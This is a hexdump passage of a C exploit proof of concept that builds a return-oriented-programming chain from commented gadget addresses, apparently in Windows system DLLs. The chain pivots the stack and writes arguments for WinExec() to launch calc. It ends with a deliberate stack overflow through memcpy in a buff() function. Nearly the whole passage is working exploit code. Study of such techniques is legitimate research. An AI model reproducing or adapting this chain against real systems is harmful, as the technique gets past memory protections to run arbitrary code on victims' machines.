00001120  38 37 5c 78 37 63 22 20  20 2f 2f 20 43 6f 6d 70  |87\x7c"  // Comp|
00001130  65 6e 73 61 74 65 20 52  45 54 4e 0d 0a 22 5c 78  |ensate RETN.."\x|
00001140  38 61 5c 78 32 30 5c 78  38 37 5c 78 37 63 22 20  |8a\x20\x87\x7c" |
00001150  20 2f 2f 20 43 6f 6d 70  65 6e 73 61 74 65 20 52  | // Compensate R|
00001160  45 54 4e 0d 0a 22 5c 78  38 61 5c 78 32 30 5c 78  |ETN.."\x8a\x20\x|
00001170  38 37 5c 78 37 63 22 20  20 2f 2f 20 43 6f 6d 70  |87\x7c"  // Comp|
00001180  65 6e 73 61 74 65 20 52  45 54 4e 0d 0a 22 5c 78  |ensate RETN.."\x|
00001190  33 32 5c 78 64 39 5c 78  34 34 5c 78 37 65 22 20  |32\xd9\x44\x7e" |
000011a0  20 2f 2f 20 58 43 48 47  20 45 41 58 2c 45 44 49  | // XCHG EAX,EDI|
000011b0  20 23 20 52 45 54 4e 0d  0a 22 5c 78 36 32 5c 78  | # RETN.."\x62\x|
000011c0  32 38 5c 78 39 37 5c 78  37 63 22 20 20 2f 2f 20  |28\x97\x7c"  // |
000011d0  41 44 44 20 45 41 58 2c  32 30 20 23 20 50 4f 50  |ADD EAX,20 # POP|
000011e0  20 45 42 50 20 23 20 52  45 54 4e 0d 0a 22 5c 78  | EBP # RETN.."\x|
000011f0  38 61 5c 78 32 30 5c 78  38 37 5c 78 37 63 22 20  |8a\x20\x87\x7c" |
00001200  20 2f 2f 20 43 6f 6d 70  65 6e 73 61 74 65 20 50  | // Compensate P|
00001210  4f 50 0d 0a 22 5c 78 36  32 5c 78 32 38 5c 78 39  |OP.."\x62\x28\x9|
00001220  37 5c 78 37 63 22 20 20  2f 2f 20 41 44 44 20 45  |7\x7c"  // ADD E|
00001230  41 58 2c 32 30 20 23 20  50 4f 50 20 45 42 50 20  |AX,20 # POP EBP |
00001240  23 20 52 45 54 4e 0d 0a  22 5c 78 38 61 5c 78 32  |# RETN.."\x8a\x2|
00001250  30 5c 78 38 37 5c 78 37  63 22 20 20 2f 2f 20 43  |0\x87\x7c"  // C|
00001260  6f 6d 70 65 6e 73 61 74  65 20 50 4f 50 0d 0a 22  |ompensate POP.."|
00001270  5c 78 36 32 5c 78 32 38  5c 78 39 37 5c 78 37 63  |\x62\x28\x97\x7c|
00001280  22 20 20 2f 2f 20 41 44  44 20 45 41 58 2c 32 30  |"  // ADD EAX,20|
00001290  20 23 20 50 4f 50 20 45  42 50 20 23 20 52 45 54  | # POP EBP # RET|
000012a0  4e 0d 0a 22 5c 78 38 61  5c 78 32 30 5c 78 38 37  |N.."\x8a\x20\x87|
000012b0  5c 78 37 63 22 20 20 2f  2f 20 43 6f 6d 70 65 6e  |\x7c"  // Compen|
000012c0  73 61 74 65 20 50 4f 50  0d 0a 22 5c 78 36 32 5c  |sate POP.."\x62\|
000012d0  78 32 38 5c 78 39 37 5c  78 37 63 22 20 20 2f 2f  |x28\x97\x7c"  //|
000012e0  20 41 44 44 20 45 41 58  2c 32 30 20 23 20 50 4f  | ADD EAX,20 # PO|
000012f0  50 20 45 42 50 20 23 20  52 45 54 4e 0d 0a 22 5c  |P EBP # RETN.."\|
00001300  78 38 61 5c 78 32 30 5c  78 38 37 5c 78 37 63 22  |x8a\x20\x87\x7c"|
00001310  20 20 2f 2f 20 43 6f 6d  70 65 6e 73 61 74 65 20  |  // Compensate |
00001320  50 4f 50 0d 0a 2f 2f 2d  2d 2d 2d 2d 2d 2d 2d 2d  |POP..//---------|
00001330  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001360  2d 2d 5b 53 61 76 65 20  53 74 61 63 6b 20 50 6f  |--[Save Stack Po|
00001370  69 6e 74 65 72 20 2b 20  70 69 76 6f 74 20 65 61  |inter + pivot ea|
00001380  78 5d 2d 2f 2f 0d 0a 22  5c 78 64 36 5c 78 64 31  |x]-//.."\xd6\xd1|
00001390  5c 78 39 35 5c 78 37 63  22 20 20 2f 2f 20 4d 4f  |\x95\x7c"  // MO|
000013a0  56 20 44 57 4f 52 44 20  50 54 52 20 44 53 3a 5b  |V DWORD PTR DS:[|
000013b0  45 41 58 2b 31 30 5d 2c  45 43 58 20 23 20 50 4f  |EAX+10],ECX # PO|
000013c0  50 20 45 42 50 20 23 20  52 45 54 4e 20 30 34 0d  |P EBP # RETN 04.|
000013d0  0a 22 5c 78 38 61 5c 78  32 30 5c 78 38 37 5c 78  |."\x8a\x20\x87\x|
000013e0  37 63 22 20 20 2f 2f 20  43 6f 6d 70 65 6e 73 61  |7c"  // Compensa|
000013f0  74 65 20 50 4f 50 0d 0a  22 5c 78 38 61 5c 78 32  |te POP.."\x8a\x2|
00001400  30 5c 78 38 37 5c 78 37  63 22 20 20 2f 2f 20 43  |0\x87\x7c"  // C|
00001410  6f 6d 70 65 6e 73 61 74  65 20 52 45 54 4e 0d 0a  |ompensate RETN..|
00001420  22 5c 78 38 61 5c 78 32  30 5c 78 38 37 5c 78 37  |"\x8a\x20\x87\x7|
00001430  63 22 20 20 2f 2f 20 43  6f 6d 70 65 6e 73 61 74  |c"  // Compensat|
00001440  65 20 52 45 54 4e 0d 0a  22 5c 78 33 33 5c 78 38  |e RETN.."\x33\x8|
00001450  30 5c 78 39 37 5c 78 37  63 22 20 20 2f 2f 20 49  |0\x97\x7c"  // I|
00001460  4e 43 20 45 41 58 20 23  20 52 45 54 4e 0d 0a 22  |NC EAX # RETN.."|
00001470  5c 78 33 33 5c 78 38 30  5c 78 39 37 5c 78 37 63  |\x33\x80\x97\x7c|
00001480  22 20 20 2f 2f 20 49 4e  43 20 45 41 58 20 23 20  |"  // INC EAX # |
00001490  52 45 54 4e 0d 0a 22 5c  78 33 33 5c 78 38 30 5c  |RETN.."\x33\x80\|
000014a0  78 39 37 5c 78 37 63 22  20 20 2f 2f 20 49 4e 43  |x97\x7c"  // INC|
000014b0  20 45 41 58 20 23 20 52  45 54 4e 0d 0a 22 5c 78  | EAX # RETN.."\x|
000014c0  33 33 5c 78 38 30 5c 78  39 37 5c 78 37 63 22 20  |33\x80\x97\x7c" |
000014d0  20 2f 2f 20 49 4e 43 20  45 41 58 20 23 20 52 45  | // INC EAX # RE|
000014e0  54 4e 0d 0a 22 5c 78 66  35 5c 78 64 36 5c 78 39  |TN.."\xf5\xd6\x9|
000014f0  31 5c 78 37 63 22 20 20  2f 2f 20 58 4f 52 20 45  |1\x7c"  // XOR E|
00001500  43 58 2c 45 43 58 20 23  20 52 45 54 4e 0d 0a 22  |CX,ECX # RETN.."|
00001510  5c 78 30 37 5c 78 33 64  5c 78 39 36 5c 78 37 63  |\x07\x3d\x96\x7c|
00001520  22 20 20 2f 2f 20 49 4e  43 20 45 43 58 20 23 20  |"  // INC ECX # |
00001530  52 45 54 4e 0d 0a 22 5c  78 64 36 5c 78 64 31 5c  |RETN.."\xd6\xd1\|
00001540  78 39 35 5c 78 37 63 22  20 20 2f 2f 20 4d 4f 56  |x95\x7c"  // MOV|
00001550  20 44 57 4f 52 44 20 50  54 52 20 44 53 3a 5b 45  | DWORD PTR DS:[E|
00001560  41 58 2b 31 30 5d 2c 45  43 58 20 23 20 50 4f 50  |AX+10],ECX # POP|
00001570  20 45 42 50 20 23 20 52  45 54 4e 20 30 34 0d 0a  | EBP # RETN 04..|
00001580  22 5c 78 38 61 5c 78 32  30 5c 78 38 37 5c 78 37  |"\x8a\x20\x87\x7|
00001590  63 22 20 20 2f 2f 20 43  6f 6d 70 65 6e 73 61 74  |c"  // Compensat|
000015a0  65 20 50 4f 50 0d 0a 22  5c 78 38 61 5c 78 32 30  |e POP.."\x8a\x20|
000015b0  5c 78 38 37 5c 78 37 63  22 20 20 2f 2f 20 43 6f  |\x87\x7c"  // Co|
000015c0  6d 70 65 6e 73 61 74 65  20 52 45 54 4e 0d 0a 22  |mpensate RETN.."|
000015d0  5c 78 38 61 5c 78 32 30  5c 78 38 37 5c 78 37 63  |\x8a\x20\x87\x7c|
000015e0  22 20 20 2f 2f 20 43 6f  6d 70 65 6e 73 61 74 65  |"  // Compensate|
000015f0  20 52 45 54 4e 0d 0a 22  5c 78 62 31 5c 78 34 66  | RETN.."\xb1\x4f|
00001600  5c 78 39 37 5c 78 37 63  22 20 20 2f 2f 20 50 4f  |\x97\x7c"  // PO|
00001610  50 20 45 43 58 20 23 20  52 45 54 4e 0d 0a 22 5c  |P ECX # RETN.."\|
00001620  78 65 64 5c 78 32 61 5c  78 38 36 5c 78 37 63 22  |xed\x2a\x86\x7c"|
00001630  20 20 2f 2f 20 57 69 6e  45 78 65 63 28 29 0d 0a  |  // WinExec()..|
00001640  22 5c 78 65 37 5c 78 63  31 5c 78 38 37 5c 78 37  |"\xe7\xc1\x87\x7|
00001650  63 22 20 20 2f 2f 20 4d  4f 56 20 44 57 4f 52 44  |c"  // MOV DWORD|
00001660  20 50 54 52 20 44 53 3a  5b 45 41 58 2b 34 5d 2c  | PTR DS:[EAX+4],|
00001670  45 43 58 20 23 20 58 4f  52 20 45 41 58 2c 45 41  |ECX # XOR EAX,EA|
00001680  58 20 23 20 50 4f 50 20  45 42 50 20 23 20 52 45  |X # POP EBP # RE|
00001690  54 4e 20 30 34 0d 0a 22  5c 78 38 61 5c 78 32 30  |TN 04.."\x8a\x20|
000016a0  5c 78 38 37 5c 78 37 63  22 20 20 2f 2f 20 43 6f  |\x87\x7c"  // Co|
000016b0  6d 70 65 6e 73 61 74 65  20 50 4f 50 0d 0a 22 5c  |mpensate POP.."\|
000016c0  78 38 61 5c 78 32 30 5c  78 38 37 5c 78 37 63 22  |x8a\x20\x87\x7c"|
000016d0  20 20 2f 2f 20 43 6f 6d  70 65 6e 73 61 74 65 20  |  // Compensate |
000016e0  52 45 54 4e 0d 0a 22 5c  78 38 61 5c 78 32 30 5c  |RETN.."\x8a\x20\|
000016f0  78 38 37 5c 78 37 63 22  20 20 2f 2f 20 43 6f 6d  |x87\x7c"  // Com|
00001700  70 65 6e 73 61 74 65 20  52 45 54 4e 0d 0a 22 5c  |pensate RETN.."\|
00001710  78 38 61 5c 78 32 30 5c  78 38 37 5c 78 37 63 22  |x8a\x20\x87\x7c"|
00001720  20 20 2f 2f 20 46 69 6e  61 6c 20 52 45 54 4e 20  |  // Final RETN |
00001730  66 6f 72 20 57 69 6e 45  78 65 63 28 29 0d 0a 22  |for WinExec().."|
00001740  5c 78 38 61 5c 78 32 30  5c 78 38 37 5c 78 37 63  |\x8a\x20\x87\x7c|
00001750  22 3b 20 2f 2f 20 43 6f  6d 70 65 6e 73 61 74 65  |"; // Compensate|
00001760  20 57 69 6e 45 78 65 63  28 29 0d 0a 2f 2f 2d 2d  | WinExec()..//--|
00001770  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000017a0  2d 2d 2d 2d 5b 57 72 69  74 65 20 41 72 67 75 6d  |----[Write Argum|
000017b0  65 6e 74 73 20 61 6e 64  20 65 78 65 63 75 74 65  |ents and execute|
000017c0  20 2d 3e 20 63 61 6c 63  5d 2d 2f 2f 0d 0a 20 0d  | -> calc]-//.. .|
000017d0  0a 76 6f 69 64 20 62 75  66 66 28 29 20 7b 0d 0a  |.void buff() {..|
000017e0  20 20 20 20 63 68 61 72  20 61 3b 0d 0a 20 20 20  |    char a;..   |
000017f0  20 6d 65 6d 63 70 79 28  28 26 61 29 2b 35 2c 20  | memcpy((&a)+5, |
00001800  73 68 65 6c 6c 63 6f 64  65 2c 20 73 69 7a 65 6f  |shellcode, sizeo|
00001810  66 28 73 68 65 6c 6c 63  6f 64 65 29 29 3b 20 2f  |f(shellcode)); /|
00001820  2f 20 43 6f 6d 70 69 6c  65 72 20 64 65 70 65 6e  |/ Compiler depen|
00001830  64 65 6e 74 2c 20 77 6f  72 6b 73 20 77 69 74 68  |dent, works with|
00001840  20 44 65 76 2d 43 2b 2b  20 34 2e 39 0d 0a 7d 0d  | Dev-C++ 4.9..}.|
00001850  0a 20 0d 0a 69 6e 74 20  6d 61 69 6e 28 29 0d 0a  |. ..int main()..|
00001860  7b 0d 0a 20 20 20 20 4c  6f 61 64 4c 69 62 72 61  |{..    LoadLibra|
00001870  72 79 28 22 55 53 45 52  33 32 2e 64 6c 6c 22 29  |ry("USER32.dll")|
00001880  3b 20 2f 2f 20 77 65 20  6e 65 65 64 20 74 68 69  |; // we need thi|
00001890  73 20 64 6c 6c 0d 0a 20  20 20 20 63 68 61 72 20  |s dll..    char |
000018a0  62 75 66 5b 31 30 32 34  5d 3b 0d 0a 20 20 20 20  |buf[1024];..    |
000018b0  62 75 66 66 28 29 3b 0d  0a 20 20 20 20 72 65 74  |buff();..    ret|
000018c0  75 72 6e 20 30 3b 0d 0a  7d                       |urn 0;..}|
000018c9
